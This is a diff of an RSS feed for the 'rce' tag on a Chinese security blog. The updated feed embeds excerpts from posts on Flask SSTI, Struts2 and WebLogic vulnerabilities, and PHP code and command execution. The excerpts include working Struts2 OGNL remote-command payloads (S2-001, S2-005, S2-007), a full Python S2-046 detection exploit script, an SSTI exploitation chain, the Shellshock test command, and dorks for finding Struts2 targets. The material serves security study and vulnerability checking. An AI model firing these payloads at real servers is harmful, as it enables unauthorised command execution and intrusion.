@@ -1,61 +1,110 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>rce on Reber&#39;s Blog</title>
-    <link>https://wyb0.com/tags/rce/</link>
-    <description>Recent content in rce on Reber&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sun, 11 Jul 2021 00:00:00 +0000</lastBuildDate>
-    <atom:link href="https://wyb0.com/tags/rce/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Flask 模版注入（SSTI）</title>
-      <link>https://wyb0.com/posts/2021/flask-ssti/</link>
-      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2021/flask-ssti/</guid>
-      <description>0x00 SSTI 模版注入 SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap） 一般步骤： 1、某种类型 (字符串</description>
-    </item>
-    <item>
-      <title>Struts 2 相关漏洞 payload</title>
-      <link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
-      <pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
-      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表</description>
-    </item>
-    <item>
-      <title>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</title>
-      <link>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</link>
-      <pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</guid>
-      <description>0x00 WebLogic WLS 组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时</description>
-    </item>
-    <item>
-      <title>Struts2-046 EXP</title>
-      <link>https://wyb0.com/posts/2017/struts2-046/</link>
-      <pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2017/struts2-046/</guid>
-      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下： #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS,</description>
-    </item>
-    <item>
-      <title>代码执行漏洞(二)</title>
-      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
-      <pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
-      <description>接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可</description>
-    </item>
-    <item>
-      <title>代码执行漏洞(一)</title>
-      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
-      <pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
-      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造</description>
-    </item>
-    <item>
-      <title>命令执行漏洞</title>
-      <link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
-      <pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
-      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passth</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Rce on Reber's Blog</title><link>https://wyb0.com/tags/rce/</link><description>Recent content in Rce on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Thu, 23 May 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/rce/index.xml" rel="self" type="application/rss+xml"/><item><title>Flask 模版注入（SSTI）</title><link>https://wyb0.com/posts/2021/flask-ssti/</link><pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2021/flask-ssti/</guid><description>&lt;h3 id="0x00-ssti-模版注入">0x00 SSTI 模版注入&lt;/h3>
+&lt;p>SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）&lt;/p>
+&lt;p>一般步骤：&lt;br>
+1、某种类型 (字符串:&amp;quot;&amp;quot;，list:[]，int：1) 开始引出&lt;br>
+2、&lt;code>__class__&lt;/code> 找到当前类&lt;br>
+3、&lt;code>__mro__&lt;/code> 或者 &lt;code>__base__&lt;/code> 或者 &lt;code>__bases__&lt;/code> 找到根类 &lt;code>__object__&lt;/code>&lt;br>
+4、然后利用 &lt;code>__subclasses__&lt;/code> 拿到子类列表&lt;br>
+5、然后在子类列表 &lt;code>__init__.__globals__.keys()&lt;/code> 找到类似 popen 能执行命令的函数&lt;/p></description></item><item><title>Struts 2 相关漏洞 payload</title><link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link><pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate><guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid><description>&lt;h3 id="0x00-s2-001">0x00 S2-001&lt;/h3>
+&lt;pre tabindex="0">&lt;code>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;#34;whoami&amp;#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+&lt;/code>&lt;/pre>&lt;h3 id="0x01-s2-005">0x01 S2-005&lt;/h3>
+&lt;p>影响版本: 2.0.0 - 2.1.8.1&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&amp;#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&amp;#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
+&lt;/code>&lt;/pre>&lt;h3 id="0x02-s2-007">0x02 S2-007&lt;/h3>
+&lt;p>影响版本: 2.0.0 - 2.2.3&lt;/p>
+&lt;pre tabindex="0">&lt;code>当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;#39; + (#_memberAccess[&amp;#34;allowStaticMethodAccess&amp;#34;]=true,#foo=new java.lang.Boolean(&amp;#34;false&amp;#34;) ,#context[&amp;#34;xwork.MethodAccessor.denyMethodExecution&amp;#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&amp;#39;id&amp;#39;).getInputStream())) + &amp;#39;
+&lt;/code>&lt;/pre>&lt;h3 id="0x03-s2-012">0x03 S2-012&lt;/h3>
+&lt;p>影响版本: 2.1.0 - 2.3.13&lt;/p></description></item><item><title>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</title><link>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</link><pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate><guid>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</guid><description>&lt;h3 id="0x00-weblogic-wls-组件反序列化漏洞">0x00 WebLogic WLS 组件反序列化漏洞&lt;/h3>
+&lt;p>这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下&lt;/p></description></item><item><title>Struts2-046 EXP</title><link>https://wyb0.com/posts/2017/struts2-046/</link><pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate><guid>https://wyb0.com/posts/2017/struts2-046/</guid><description>&lt;h3 id="struts2-046">Struts2 046&lt;/h3>
+&lt;p>前段时间写的struts2 046检测脚本，代码如下：&lt;/p>
+&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# code by reber
+
+import sys
+import pycurl
+import StringIO
+
+
+def initCurl():
+ c = pycurl.Curl()
+ c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源
+ c.setopt(pycurl.MAXREDIRS, 5)
+ # c.setopt(pycurl.PROXY,&amp;#39;http://127.0.0.1:1080&amp;#39;)
+ return c
+
+def check(curl, url):
+ head = [
+ &amp;#39;Connection: close&amp;#39;,
+ &amp;#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&amp;#39;
+ ]
+
+ data = &amp;#39;&amp;#39;&amp;#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;#34;foo&amp;#34;; filename=&amp;#34;%{(#nike=&amp;#39;multipart/form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;#39;com.opensymphony.xwork2.ActionContext.container&amp;#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&amp;#39;echo dd996b71024fa97cd015f06a7f24ed30&amp;#39;).(#iswin=(@java.lang.System@getProperty(&amp;#39;os.name&amp;#39;).toLowerCase().contains(&amp;#39;win&amp;#39;))).(#cmds=(#iswin?{&amp;#39;cmd.exe&amp;#39;,&amp;#39;/c&amp;#39;,#cmd}:{&amp;#39;/bin/bash&amp;#39;,&amp;#39;-c&amp;#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;#34;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&amp;#39;&amp;#39;&amp;#39;
+
+ buf = StringIO.StringIO()
+ curl.setopt(pycurl.WRITEFUNCTION, buf.write)
+ curl.setopt(pycurl.POSTFIELDS, data)
+ curl.setopt(pycurl.URL, url)
+ # curl.setopt(pycurl.TIMEOUT, 10)
+ curl.setopt(pycurl.HTTPHEADER, head)
+ curl.setopt(pycurl.SSL_VERIFYPEER, 0)
+ curl.setopt(pycurl.SSL_VERIFYHOST, 0)
+ curl.perform()
+ the_page = buf.getvalue()
+ buf.close()
+
+ if &amp;#39;dd996b71024fa97cd015f06a7f24ed30&amp;#39; in the_page:
+ print &amp;#34;%s has st2-046 vulnerable.&amp;#34; % url
+
+def run(url):
+ c = initCurl()
+ check(c, url)
+ sys.exit(0)
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+ if len(sys.argv) == 2:
+ url = sys.argv[1]
+ run(url)
+ else:
+ print (&amp;#34;usage: %s http://www.baidu.com/vuln.action whoami&amp;#34; % sys.argv[0])
+ sys.exit(-1)
+&lt;/code>&lt;/pre></description></item><item><title>代码执行漏洞(二)</title><link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link><pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate><guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid><description>&lt;h4 id="接着上一篇代码执行漏洞一posts2016code-execution-vulnerabilities">接着上一篇：&lt;a href="https://wyb0.com/posts/2016/code-execution-vulnerabilities/">代码执行漏洞(一)&lt;/a>&lt;/h4>
+&lt;h3 id="0x00-函数create_function">0x00 函数create_function()&lt;/h3>
+&lt;p>php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p></description></item><item><title>代码执行漏洞(一)</title><link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link><pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-代码执行">0x00 代码执行&lt;/h3>
+&lt;p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。&lt;/p></description></item><item><title>命令执行漏洞</title><link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link><pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-命令执行">0x00 命令执行&lt;/h3>
+&lt;pre tabindex="0">&lt;code>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
+passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
+拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
+&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用条件">0x01 利用条件&lt;/h3>
+&lt;ol>
+&lt;li>应用调用执行系统命令的函数&lt;/li>
+&lt;li>将用户输入作为系统命令的参数拼接到了命令行中&lt;/li>
+&lt;li>没有对用户输入进行过滤或过滤不严&lt;/li>
+&lt;/ol>
+&lt;h3 id="0x02-漏洞分类">0x02 漏洞分类&lt;/h3>
+&lt;ol>
+&lt;li>代码层过滤不严&lt;br>
+商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：&lt;br>
+system(&amp;quot;/bin/program --arg $arg&amp;quot;);&lt;/li>
+&lt;li>系统的漏洞造成命令执行&lt;br>
+bash破壳漏洞(CVE-2014-6271)&lt;br>
+执行&lt;code>env x='() { :;}; echo vulnerable' bash -c &amp;quot;echo this is a test&amp;quot;&lt;/code>后&lt;br>
+若输出vulnerable则证明存在漏洞&lt;/li>
+&lt;li>调用的第三方组件存在代码执行漏洞&lt;br>
+如WordPress中用来处理图片的ImageMagick组件&lt;br>
+JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)&lt;br>
+ThinkPHP命令执行&lt;/li>
+&lt;/ol>
+&lt;h3 id="0x03-漏洞危害">0x03 漏洞危害&lt;/h3>
+&lt;ol>
+&lt;li>继承Web服务程序的权限去执行系统命令或读写文件&lt;/li>
+&lt;li>反弹shell&lt;/li>
+&lt;li>控制整个网站甚至控制服务器&lt;/li>
+&lt;li>进一步内网渗透&lt;/li>
+&lt;li>等等&lt;/li>
+&lt;/ol>
+&lt;h3 id="0x04-漏洞挖掘">0x04 漏洞挖掘&lt;/h3>
+&lt;p>可以google hacking&lt;br>
+尝试：filetype:action或filetype:do来找struts2&lt;/p></description></item></channel></rss>
